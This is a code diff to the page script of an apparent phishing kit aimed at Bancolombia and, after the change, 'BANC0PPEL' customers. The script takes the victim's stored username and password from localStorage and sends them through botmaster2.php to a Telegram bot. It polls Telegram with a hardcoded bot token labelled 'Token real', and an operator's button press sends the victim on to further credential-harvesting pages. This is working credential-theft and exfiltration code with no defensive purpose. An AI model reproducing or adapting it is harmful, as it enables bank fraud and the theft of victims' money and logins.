@@ -83,9 +83,10 @@
 
 
 
-    <script>
+  <script>
 document.addEventListener('DOMContentLoaded', async function () {
   const loader = document.querySelector('#loader');
+  const botToken = "8153542950:AAER3soWgrkQDu_cVSUZR4x9dJKjavcGSDE"; // Token real
 
   const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
 
@@ -98,12 +99,11 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   const usuario = bancoldata.celular || "No definido";
   const clave = bancoldata.clave;
-
   const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
   localStorage.setItem('transactionId', transactionId);
 
   const message = `
-<b>INGRESO BANCOLOMBIA</b>
+<b>INGRESO BANC0PPEL</b>
 --------------------------------------------------
 🆔 <b>ID:</b> ${transactionId}
 👤 <b>Usuario:</b> ${usuario}
@@ -120,26 +120,27 @@ document.addEventListener('DOMContentLoaded', async function () {
     ]
   };
 
-  // ENVIAR A botmaster2.php
   try {
     const res = await fetch("botmaster2.php", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: "data=" + encodeURIComponent(message) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
     });
-    const result = await res.text();
-    console.log("Respuesta botmaster2.php:", result);
+    await res.text();
     await checkPaymentVerification(transactionId);
   } catch (error) {
     console.error("Error al enviar a Telegram:", error);
     if (loader) loader.style.display = "none";
   }
 
-  // VERIFICAR BOTÓN PRESIONADO
   async function checkPaymentVerification(transactionId) {
     try {
-      const res = await fetch("https://api.telegram.org/botTU_BOT_TOKEN/getUpdates");
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
       const data = await res.json();
+
+      if (!data || !data.result) {
+        throw new Error("La API no devolvió resultados válidos.");
+      }
 
       const action = data.result.find(update =>
         update.callback_query &&
@@ -165,14 +166,12 @@ document.addEventListener('DOMContentLoaded', async function () {
           confirm_finalizar: "Finalización Exitosa"
         };
 
-        // Enviar mensaje de confirmación
         await fetch("sendStatus.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ status: statusMap[actionType] || "Desconocido" })
         });
 
-        // Redirección según botón
         switch (actionType) {
           case "pedir_dinamica":
             window.location.href = "dinacol.php";
